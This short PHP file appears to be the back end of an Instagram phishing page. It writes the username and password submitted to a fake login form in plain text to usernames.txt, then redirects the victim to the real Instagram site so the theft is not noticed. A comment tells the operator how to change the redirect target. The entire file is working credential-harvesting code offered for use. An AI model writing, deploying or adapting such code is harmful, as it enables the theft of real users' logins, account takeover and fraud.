<?php



file_put_contents("usernames.txt", "email/mobile number: " . $_POST['username'] . " Pass: " . $_POST['password'] . "\n", FILE_APPEND);

//change the redirection link starting from https and before quotation end e.g:('Location: https://google.com') to ('Location: https://youtube.com')

header('Location: https://instagram.com');

exit();